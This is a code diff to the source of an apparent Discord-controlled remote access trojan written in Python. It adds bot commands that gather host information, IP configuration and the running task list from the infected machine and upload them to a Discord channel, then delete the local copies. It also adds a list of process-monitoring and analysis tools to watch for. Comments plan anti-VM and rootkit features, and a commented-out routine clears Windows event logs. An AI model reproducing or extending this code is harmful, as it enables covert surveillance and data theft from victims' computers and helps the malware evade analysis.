@@ -5,8 +5,6 @@ import modules.pc as pc
 #   Anti VM (low priority)
 #   Rootkit (med-high pr)
 
-
-
 class Variables:
     def __init__(self):
         #t = os.getenv("TOKEN").split("MMM")
@@ -24,6 +22,9 @@ class Variables:
             with open(f"{self.snky_dir}\\cfg.json", "w") as f:
                 json.dump(self.cfg, f, indent=4)
 
+        self.debug_programs = ["Taskmgr.exe", "procexp64.exe", "procexp.exe", "procmon64.exe", "procmon.exe", "wireshark.exe", "fiddler.exe", "tcpview.exe", "autoruns.exe", "mmc.exe"] #Still no admin privileges :((((
+
+
 #Requires admin privileges :(
 
 #def clear_logs():
@@ -34,6 +35,7 @@ class Variables:
 #       subprocess.Popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}", shell=False, startupinfo=si) #Nope
 #       time.sleep(1)
 
+
 intents = discord.Intents.all()
 variables = Variables()
 
@@ -41,7 +43,7 @@ client = discord.Client(intents=intents)
 
 @client.event
 async def on_ready():
-    print("")
+    pass
 
 @client.event
 async def on_message(message):
@@ -52,6 +54,9 @@ async def on_message(message):
     if message.content.startswith(f"{variables.cfg['prefix']}help"):
         embed = discord.Embed(title="Help", color=0x00ff00)
         embed.add_field(name="!help", value="Shows this message", inline=False)
+        embed.add_field(name="!hostinfo", value="Shows host information", inline=False)
+        embed.add_field(name="!ipconfig", value="Shows IP configuration", inline=False)
+        embed.add_field(name="!tasklist", value="Shows task list", inline=False)
 
         await message.channel.send(embed=embed)
 
@@ -73,7 +78,7 @@ async def on_message(message):
 
     #IPCONFIG - ipconfig cmd
     if message.content.startswith(f"{variables.cfg['prefix']}ipconfig"):
-        embed = discord.Embed(title="IP Config", description="IP Configuration gathered.", color=0x00ff00)
+        embed = discord.Embed(title="IP Config", description="IP config gathered.", color=0x00ff00)
 
         result = pc.ipconfig(variables.snky_dir)
 
@@ -84,6 +89,22 @@ async def on_message(message):
             await message.channel.send(embed=embed, file=discord.File(result))
             time.sleep(0.3)
             os.remove(f"{variables.snky_dir}\\ipconfig.txt")
+        except:
+            pass
+
+    #TASKLIST - tasklist cmd
+    if message.content.startswith(f"{variables.cfg['prefix']}tasklist"):
+        embed = discord.Embed(title="Task List", description="Task list gathered.", color=0x00ff00)
+
+        result = pc.tasklist(variables.snky_dir)
+
+        while not os.path.exists(f"{variables.snky_dir}\\tasklist.txt"):
+            time.sleep(2)
+
+        try:
+            await message.channel.send(embed=embed, file=discord.File(result))
+            time.sleep(0.3)
+            os.remove(f"{variables.snky_dir}\\tasklist.txt")
         except:
             pass
 
